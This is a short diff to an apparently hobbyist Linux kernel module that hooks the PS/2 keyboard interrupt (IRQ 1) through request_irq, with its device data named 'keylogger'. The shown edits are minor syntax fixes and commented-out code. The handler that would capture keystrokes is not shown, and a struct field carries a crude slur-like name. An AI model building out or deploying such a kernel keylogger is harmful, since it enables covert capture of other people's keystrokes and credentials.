@@ -7,6 +7,7 @@
 #include <linux/usb/input.h>
 #include <linux/hid.h>
 #include <linux/interrupt.h>
+#include <linux/irqnr.h>
 
 MODULE_AUTHOR("jng");
 MODULE_LICENSE("GPL");
@@ -67,12 +68,18 @@ int init_module(void)
 
 	// if interrupt here wrong or irq, gotta ditch the usb and go PURE PS2
 	int kb_irq = 1;
+	// struct irq_desc *desc;
+
 	struct test { 
 		int gay;
-	}
+	};
 	struct test keylogger = {
 		.gay = 1,
 	};
+	// desc = irq_to_desc(kb_irq);
+	// if (!desc)
+	// 	return -EINVAL;
+
 	int req_irq_result = request_irq(kb_irq, &handler, IRQF_SHARED, "my_keyboard", &keylogger);
 	if (req_irq_result < 0)
 		printk(KERN_INFO "IRQ REQUEST ERR !: %d\n", req_irq_result);
